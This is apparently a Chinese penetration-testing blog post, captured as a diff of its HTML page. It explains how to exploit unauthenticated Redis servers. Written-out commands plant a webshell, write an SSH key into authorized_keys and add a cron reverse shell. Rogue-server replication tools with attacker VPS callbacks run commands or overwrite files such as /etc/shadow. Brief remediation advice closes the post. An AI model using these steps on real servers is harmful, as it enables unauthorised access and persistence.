@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Redis 在渗透测试中常见的利用方式 - Geekby&#39;s Blog</title><meta name="Description" content="Redis 在渗透测试中常见的利用方式"><meta property="og:title" content="Redis 在渗透测试中常见的利用方式" />
+<meta property="og:description" content="Redis 在渗透测试中常见的利用方式" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-05-25T09:27:00+08:00" />
+<meta property="article:modified_time" content="2020-05-25T09:27:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Redis 在渗透测试中常见的利用方式"/>
+<meta name="twitter:description" content="Redis 在渗透测试中常见的利用方式"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" /><link rel="prev" href="https://www.geekby.site/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/" /><link rel="next" href="https://www.geekby.site/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Redis 在渗透测试中常见的利用方式",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2020\/05\/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "Redis, 渗透测试","wordcount":  289 ,
+        "url": "https:\/\/www.geekby.site\/2020\/05\/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F\/","datePublished": "2020-05-25T09:27:00+08:00","dateModified": "2020-05-25T09:27:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "Redis 在渗透测试中常见的利用方式"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Redis 在渗透测试中常见的利用方式</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-25">2020-05-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 289 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-写入-webshell">1 写入 webshell</a></li>
+    <li><a href="#2-写入-ssh-公钥">2 写入 ssh 公钥</a>
+      <ul>
+        <li><a href="#21-生成公私钥对">2.1 生成公私钥对</a></li>
+        <li><a href="#22-利用-redis-config-写文件">2.2 利用 redis config 写文件</a></li>
+        <li><a href="#23-利用公私钥对登录">2.3 利用公私钥对登录</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-写定时任务反弹-shell">3 写定时任务反弹 shell</a></li>
+    <li><a href="#4-主从复制">4 主从复制</a>
+      <ul>
+        <li><a href="#41-加载扩展模块执行系统命令">4.1 加载扩展模块执行系统命令</a></li>
+        <li><a href="#42-主从复制写入纯净文件">4.2 主从复制写入纯净文件</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-漏洞修复">5 漏洞修复</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="redis-在渗透测试中常见的利用方式">Redis 在渗透测试中常见的利用方式</h1>
+<blockquote>
+<p>本文主要以 redis 未授权或已知 redis 口令为前提进行漏洞利用</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525095914.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525095914.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525095914.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525095914.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525095914.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525095914.png-water_print" /></p>
+<h2 id="1-写入-webshell">1 写入 webshell</h2>
+<p>条件：</p>
+<ul>
+<li>已知 web 目录绝对路径</li>
+<li>拥有该目录下的可写权限</li>
+</ul>
+<p>查看所有键，创建新键，键值为 webshell，这里以写入 phpinfo 进行一个演示。</p>
+<p>因为创建新键赋键值会把原来的键值覆盖，所以需要在赋值的时候需要查看所有的键，然后选择一个没有的键创建赋值。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">keys *
+<span class="nb">set</span> x <span class="s2">&#34;\n\n&lt;?php pnpinfo();?&gt;\n&#34;</span>
+get x
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100009.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100009.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100009.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100009.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100009.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100009.png-water_print" /></p>
+<p>查看 redis 数据库配置信息，因为我们写 Webshell 会修改 <code>dir</code> 和 <code>dbfilename</code>，所以这里查看配置信息主要记下原来的值，好在写入后修改回来。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">config get *
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100101.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100101.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100101.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100101.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100101.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100101.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100117.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100117.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100117.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100117.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100117.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525100117.png-water_print" /></p>
+<p>设置 webshell 输出目录和文件名，然后写入 Webshell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">config <span class="nb">set</span> dir /var/www    <span class="c1"># 设置文件写入目录</span>
+config <span class="nb">set</span> dbfilename 1.php   <span class="c1"># 设置写入文件名</span>
+save <span class="c1"># 保存</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525101443.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525101443.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525101443.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525101443.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525101443.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525101443.png-water_print" /></p>
+<p>最后，再还原数据库配置。</p>
+<h2 id="2-写入-ssh-公钥">2 写入 ssh 公钥</h2>
+<p>条件：</p>
+<ul>
+<li>已知启动服务的用户</li>
+<li>拥有 .ssh 目录</li>
+<li>允许使用基于密钥认证的方式登陆</li>
+</ul>
+<h3 id="21-生成公私钥对">2.1 生成公私钥对</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa    <span class="c1"># 生成公钥和私钥</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="22-利用-redis-config-写文件">2.2 利用 redis config 写文件</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">set</span> x <span class="s2">&#34;\n\n公钥内容\n&#34;</span>
+config <span class="nb">set</span> dir /home/user/.ssh
+config <span class="nb">set</span> dbfilename authorized_keys
+save
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="23-利用公私钥对登录">2.3 利用公私钥对登录</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -i id_rsa user@ip
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="3-写定时任务反弹-shell">3 写定时任务反弹 shell</h2>
+<p>条件：</p>
+<ul>
+<li>拥有计划任务目录写权限</li>
+<li>目标启动计划服务</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">keys *    查看所有键
+<span class="nb">set</span> x <span class="s2">&#34;\n\n计划任务内容\n\n&#34;</span>    
+config get *    
+config <span class="nb">set</span> dir /var/spool/cron    
+config <span class="nb">set</span> dbfilename root    
+save    保存，完成文件写入
+del x    删除创建的x键
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="4-主从复制">4 主从复制</h2>
+<h3 id="41-加载扩展模块执行系统命令">4.1 加载扩展模块执行系统命令</h3>
+<p>具体的原理在之前漏洞复现的文章中已经解释过。</p>
+<p>脚本地址：<a href="https://github.com/Dliv3/redis-rogue-server" target="_blank" rel="noopener noreffer">https://github.com/Dliv3/redis-rogue-server</a></p>
+<p>主动连接模式：</p>
+<p>参数说明</p>
+<ul>
+<li><code>--rpasswd</code> 如果目标 Redis 服务开启了认证功能，可以通过该选项指定密码</li>
+<li><code>--rhost</code> 目标 redis 服务 IP</li>
+<li><code>--rport</code> 目标 redis 服务端口，默认为 6379</li>
+<li><code>--lhost</code> vps 的外网 IP 地址</li>
+<li><code>--lport</code> vps 监控的端口，默认为 21000</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 redis-rogue-server.py --rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104637.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104637.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104637.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104637.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104637.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104637.png-water_print" /></p>
+<p>被动连接模式：</p>
+<p>适用于目标Redis服务处于内网的情况</p>
+<ul>
+<li>通过 SSRF 攻击 Redis</li>
+<li>内网 Redis 未授权访问/已知 Redis 口令，Redis 需要反向连接 redis rogue server</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 redis-rogue-server.py --server-only
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="42-主从复制写入纯净文件">4.2 主从复制写入纯净文件</h3>
+<p>在 linux 下，可以利用 SYNC 主从同步，来直接写入无杂质的文件，脚本如下：</p>
+<p><a href="https://github.com/r35tart/RedisWriteFile" target="_blank" rel="noopener noreffer">https://github.com/r35tart/RedisWriteFile</a></p>
+<p>此脚本是通过 <code>Redis</code> 主从写出无损文件，可用于 <code>Windows</code> 平台下写出无损的 <code>EXE</code>、<code>DLL</code>、 <code>LNK</code> 和 <code>Linux</code> 下的 <code>SO</code> 等二进制文件</p>
+<p>也可以用无杂质覆写 <code>Linux</code> 中的 <code>/etc/shadow</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 RedisWriteFile.py --rhost 172.17.0.2 --rport <span class="m">6379</span> --lhost 172.17.0.1 --lport <span class="m">4444</span> --rpath <span class="s2">&#34;/var/www&#34;</span> --rfile <span class="s2">&#34;test.php&#34;</span> --lfile <span class="s2">&#34;./phpinfo.php&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104700.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104700.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104700.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104700.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104700.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104700.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104744.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104744.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104744.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104744.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104744.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200525104744.png-water_print" /></p>
+<p>上述方法主要是针对 linux，当 windows 上未开启 web 服务时，该如何 getshell？</p>
+<p>下面介绍下 redis 在 windows 下的常见打法：</p>
+<ol>
+<li>系统 <code>DLL</code> 劫持 （目标重启或注销）</li>
+<li>针对特定软件的 <code>DLL</code> 劫持（目标一次点击）</li>
+<li>覆写目标的快捷方式 （目标一次点击）</li>
+<li>覆写特定软件的配置文件达到提权目的 （目标无需点击或一次点击）</li>
+<li>覆写 <code>sethc.exe</code> 等文件 （攻击方一次触发）</li>
+</ol>
+<p>参考：<a href="http://r3start.net/index.php/2020/05/25/717" target="_blank" rel="noopener noreffer">http://r3start.net/index.php/2020/05/25/717</a></p>
+<h2 id="5-漏洞修复">5 漏洞修复</h2>
+<ul>
+<li>设置密码认证</li>
+<li>尽量以低权限来运行 Redis 服务</li>
+<li>限制登录 IP</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-05-25</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" data-title="Redis 在渗透测试中常见的利用方式"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" data-title="Redis 在渗透测试中常见的利用方式"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" data-title="Redis 在渗透测试中常见的利用方式"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/redis/">Redis</a>,&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/" class="prev" rel="prev" title="SaltStack 远程命令执行漏洞复现（CVE-2020-11651）"><i class="fas fa-angle-left fa-fw"></i>SaltStack 远程命令执行漏洞复现（CVE-2020-11651）</a>
+            <a href="/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/" class="next" rel="next" title="Flask SSTI 利用方式探索">Flask SSTI 利用方式探索<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
